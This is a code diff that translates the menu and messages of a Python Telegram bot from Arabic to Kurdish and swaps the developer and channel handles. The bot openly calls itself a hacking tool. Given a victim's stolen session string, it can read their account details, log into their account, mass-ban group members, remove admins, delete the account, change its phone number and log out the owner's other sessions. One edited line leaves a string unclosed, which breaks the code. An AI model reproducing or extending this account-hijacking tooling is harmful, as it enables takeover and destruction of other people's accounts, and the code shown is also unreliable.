@@ -136,7 +136,7 @@ async def userchannels(strses):
     i = ""
     for x in k.chats:
       try:
-        i += f'\n▾∮ اسم القنـاة {x.title} - معرف القنـاة @{x.username}\n'
+        i += f'\n▾∮ ناوی چەناڵ  {x.title} - یوزەری چەناڵ @{x.username}\n'
       except:
         pass
     return str(i)
@@ -146,49 +146,49 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "O_8_F"
+channel = "MGIMT"
 menu = '''
 
-A :  ** تحقق من قنوات ومجموعات الحساب **
+A :  ** پشکنینی چە ناڵ و گرووپی ئەکاونت **
 
-B : ** اضهار معلومات الحساب كالرقم والايدي والاسم....الخ**
+B : ** پیشاندانی زانیاری ئەکاونت وەك ژمارە, ناسنامە, ناو.... هتد**
 
-C : ** لـحظر جميع اعضاء مجموعة معينة**
+C : ** بۆ دەرکردنی هەموو ئەندامانی گروپێکی دیاریکراو**
 
-D : ** تسجيل الدخول الى حساب المستخدم **
+D : ** چوونەژوورەوە بۆ ئەکاونتی بەکارهێنەر **
 
-E : ** اشتراك بقناة معينة** 
+E : ** بەشداری بکە لە چەناڵێکی دیاریکراودا** 
 
-F : ** مغادرة قناة معينة **
+F : ** دەرچوون لەچەناڵی دیاریکراو  **
 
-G : ** حذف قناة او مجموعة **
+G : ** سڕینەوەی چەنا و گرووپ **
 
-H : ** التحقق اذا كان التحقق بخطوتين مفعل ام لا **
+H : ** بپشکنە کە ئایا سەلماندنی دوو هەنگاو چالاککراوە یان نا **
 
-I : ** تسجيل الخروج من جميع الجلسات عدا جلسة البوت **
+I : ** چوونە دەرەوە لە هەموو دانیشتنەکان جگە لە دانیشتنی بۆت **
 
-J : ** حذف الحساب نهائيا**
+J : ** بە هەمیشەیی ئەکاونتەکە بسڕەوە**
 
-K : ** تنزيل جميع المشرفين من مجموعة معينة او قناة **
+K : ** داگرتنی هەموو بەڕێوەبەرەکان لە گرووپ یان چەناڵێکی دیاریکراوەوە **
 
-L : ** رفع مشرف لشخص معين في قناة او مجموعة **
+L : ** زیادکردنی بەڕێوبەرێك بۆ کەسێکی دیاریکراو لەچەناڵێک یان گروپێکدا **
 
-M : ** تغيير رقم الهاتف  **
+M : ** گۆڕینی ژمارەی  مۆبایل  **
 
-** مميزات اكثر قريبا  ** 
- المبرمج :@O_8_F
+** تایبەتمەندی زیاتر بەم زووانە دێت ** 
+ گەشەپێدەر :IQ7amo
 '''
 mm = '''
-** اهلا بك في بوت الاختراق  يمكنك اختراق اي شخص عبر كود تيرمكس
+** بەخێربێیت بۆ بۆتێکی هاککردن دەتوانی هەر کەسێک هاك بکەیت لە ڕێگەی کۆدی تێرمێکس
 
-- اضغط على  /IQ
+- دەست بدە لە  /IQ
 **
 '''
 @client.on(events.NewMessage(pattern="/start"))
 async def op(event):
   global mm
   if not event.is_private:
-    await event.reply("▾∮ عذرا البوت يعمل في الخاص فقط")
+    await event.reply("▾∮ ببورە بۆتەکە تەنھا لە تایبەت کاردەکات")
   else:
     await event.reply(mm)
 @client.on(events.NewMessage(pattern="/give"))
@@ -204,29 +204,29 @@ async def op(event):
 
 @client.on(events.NewMessage(pattern="/IQ", func=lambda x: x.is_group))
 async def op(event):
-  await event.reply("▾∮ عذرا البوت يعمل في الخاص فقط")
+  await event.reply("▾∮ ببورە بۆتەکە تەنھا لە تایبەت کاردەکات")
 @client.on(events.NewMessage(pattern="/IQ", func = lambda x: x.is_private))
 async def start(event):
   global menu
   async with bot.conversation(event.chat_id) as x:
-    await x.send_message(f"▾∮ قـائمة اوامر البوت :\n{menu}")
+    await x.send_message(f"▾∮ لیستی فەرمانی بۆت  :\n{menu}")
     res = await x.get_response()
     r = res.text
     if res.text == "A":
-      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
+      await x.send_message("▾∮ کۆدی تێرمۆکس بنێرە ئێستا")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
+        return await event.respond("▾∮ ببورە ئەم کۆدە بەسەرچووە")
       try:
         i = await userchannels(strses.text)
       except:
-        return await event.reply("▾∮ عذرا هذا الكود انتهت صلاحيته ")
+        return await event.reply("▾∮ ببورە ئەم کۆدە بەسەرچووە")
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\n▾∮ المعلومات بواسطه بوت تيرمكس")
+        file.write(i + "\n\n▾∮ زانیاریەکان بەهۆی بۆت تێرمۆکس)
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
